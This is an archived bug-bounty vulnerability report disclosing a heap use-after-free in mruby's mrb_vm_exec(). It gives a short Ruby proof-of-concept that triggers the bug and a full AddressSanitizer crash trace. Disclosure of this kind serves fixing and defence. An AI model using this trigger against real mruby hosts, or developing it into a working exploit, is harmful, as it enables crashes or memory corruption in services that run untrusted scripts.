# heap use-after-free in mrb_vm_exec()

## Report Details
- **Report ID**: 216700
- **URL**: https://hackerone.com/reports/216700
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-03-28T14:46:47.453Z
- **Disclosed**: 2017-05-13T21:29:14.530Z

## Reporter
- **Username**: mg36
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
The code bellow triggers a heap use-after-free vulnerability: 
```
class M
def M.new(r)
    super
    new(0)
    end
end
M.new(0)
```

ASAN report : 
```
=================================================================
==25617==ERROR: AddressSanitizer: heap-use-after-free on address 0xf4103e50 at pc 0x080f7231 bp 0xffc69ab8 sp 0xffc69690
WRITE of size 12 at 0xf4103e50 thread T0
    #0 0x80f7230 in __asan_memcpy (/home/simo/mruby/bin/mruby+0x80f7230)
    #1 0x822b8c3 in mrb_vm_exec /home/simo/mruby/src/vm.c:1454:28
    #2 0x824be7e in mrb_vm_run /home/simo/mruby/src/vm.c:823:10
    #3 0x824be7e in mrb_top_run /home/simo/mruby/src/vm.c:2614
    #4 0x83d1ebe in mrb_load_exec /home/simo/mruby/mrbgems/mruby-compiler/core/parse.y:5760:7
    #5 0x83d2ebe in mrb_load_file_cxt /home/simo/mruby/mrbgems/mruby-compiler/core/parse.y:5769:10
    #6 0x813af56 in main /home/simo/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227:11
    #7 0xf7497636 in __libc_start_main (/lib/i386-linux-gnu/libc.so.6+0x18636)
    #8 0x806613b in _start (/home/simo/mruby/bin/mruby+0x806613b)

0xf4103e50 is located 1488 bytes inside of 1536-byte region [0xf4103880,0xf4103e80)
freed by thread T0 here:
    #0 0x810ffe3 in realloc (/home/simo/mruby/bin/mruby+0x810ffe3)
    #1 0x82b23ea in mrb_default_allocf /home/simo/mruby/src/state.c:60:12
    #2 0x8211af5 in stack_extend_alloc /home/simo/mruby/src/vm.c:161:33
    #3 0x8211af5 in stack_extend /home/simo/mruby/src/vm.c:181
    #4 0x820efe6 in mrb_funcall_with_block /home/simo/mruby/src/vm.c:423:7
    #5 0x81ac297 in mrb_instance_new /home/simo/mruby/src/class.c:1415:3
    #6 0x822b8a5 in mrb_vm_exec /home/simo/mruby/src/vm.c:1454:28
    #7 0x824be7e in mrb_vm_run /home/simo/mruby/src/vm.c:823:10
    #8 0x824be7e in mrb_top_run /home/simo/mruby/src/vm.c:2614
    #9 0x83d1ebe in mrb_load_exec /home/simo/mruby/mrbgems/mruby-compiler/core/parse.y:5760:7
    #10 0x83d2ebe in mrb_load_file_cxt /home/simo/mruby/mrbgems/mruby-compiler/core/parse.y:5769:10

previously allocated by thread T0 here:
    #0 0x810ffe3 in realloc (/home/simo/mruby/bin/mruby+0x810ffe3)
    #1 0x82b23ea in mrb_default_allocf /home/simo/mruby/src/state.c:60:12
    #2 0x815c6d5 in mrb_malloc /home/simo/mruby/src/gc.c:236:10
    #3 0x815c6d5 in mrb_calloc /home/simo/mruby/src/gc.c:254
    #4 0x820e201 in mrb_funcall_with_block /home/simo/mruby/src/vm.c:354:13
    #5 0x820d26b in mrb_funcall_argv /home/simo/mruby/src/vm.c:461:10
    #6 0x81ac84a in mrb_obj_new /home/simo/mruby/src/class.c:1429:5
    #7 0x844fa8b in mrb_exc_new_str /home/simo/mruby/src/error.c:32:10
    #8 0x844fa8b in mrb_init_exception /home/simo/mruby/src/error.c:553
    #9 0x845c727 in mrb_init_core /home/simo/mruby/src/init.c:41:3

SUMMARY: AddressSanitizer: heap-use-after-free (/home/simo/mruby/bin/mruby+0x80f7230) in __asan_memcpy
Shadow bytes around the buggy address:
  0x3e820770: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x3e820780: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x3e820790: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x3e8207a0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x3e8207b0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
=>0x3e8207c0: fd fd fd fd fd fd fd fd fd fd[fd]fd fd fd fd fd
  0x3e8207d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3e8207e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3e8207f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3e820800: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3e820810: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==25617==ABORTING
```

Thanks


## Attachments
No attachments
